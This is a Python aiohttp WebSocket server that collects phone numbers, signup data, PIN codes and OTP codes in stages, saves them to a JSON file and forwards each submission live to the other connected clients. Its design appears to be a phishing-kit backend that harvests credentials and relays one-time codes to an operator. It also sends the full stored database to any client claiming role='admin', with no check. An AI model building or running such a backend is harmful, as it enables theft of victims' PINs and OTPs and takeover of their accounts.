import asyncio
import websockets
import json
import os
from datetime import datetime
from aiohttp import web

# --- WebSocket Server Setup ---

connected_clients = set()
database_file = 'database.json'

def load_data():
    """Load data from the JSON file."""
    try:
        with open(database_file, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_data(data):
    """Save data to the JSON file."""
    with open(database_file, 'w') as f:
        json.dump(data, f, indent=4)

async def websocket_handler(request):
    """Handles WebSocket connections."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    connected_clients.add(ws)
    print(f"New WebSocket client connected. Total clients: {len(connected_clients)}")

    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                message = msg.data
                print(f"Received WebSocket message: {message}")
                try:
                    data = json.loads(message)
                    
                    is_admin = data.get("role") == "admin"
                    if is_admin:
                        db = load_data()
                        await ws.send_str(json.dumps(db))
                        print("Admin requested data. Sent database content.")
                    
                    else:
                        db = load_data()
                        user_key = data.get("phone_number", "unknown_user")
                        
                        # Use a timestamp to identify sessions
                        now = datetime.now().isoformat()
                        
                        # --- New logic to handle different forms ---
                        if data.get("step") == "signup":
                            # This is the initial signup data
                            data["timestamp"] = now
                            db[user_key] = data
                            save_data(db)
                            print(f"Data saved for user: {user_key}")
                        elif data.get("step") == "pin_entry":
                            # This is the pin form data
                            if user_key in db:
                                db[user_key]["pin_code"] = data.get("pin_code")
                                save_data(db)
                                print(f"PIN saved for user: {user_key}")
                        elif data.get("step") == "otp_verification":
                            # This is the OTP data
                            if user_key in db:
                                db[user_key]["otp_code"] = data.get("otp_code")
                                db[user_key]["timestamp_otp"] = now
                                save_data(db)
                                print(f"OTP saved for user: {user_key}")

                        for client in connected_clients:
                            if client != ws:
                                await client.send_str(message)
                                print("WebSocket message forwarded.")
                except json.JSONDecodeError:
                    print(f"Error decoding JSON: {message}")
    finally:
        connected_clients.remove(ws)
        print(f"WebSocket client disconnected. Total clients: {len(connected_clients)}")
    return ws

# --- Health Check Endpoint ---

async def health_check(request):
    """A simple HTTP endpoint for Render's health checks."""
    print("Received health check request.")
    return web.Response(text="OK")

# --- Main Application Setup ---

async def main():
    app = web.Application()
    app.router.add_get('/', health_check)  
    app.router.add_get('/ws', websocket_handler)

    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get('PORT', 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    
    print(f"Server started on port {port}")
    
    try:
        await site.start()
        print("Server is listening...")
        while True:
            await asyncio.sleep(3600)
    except Exception as e:
        print(f"Error starting server: {e}")

if __name__ == '__main__':
    asyncio.run(main())
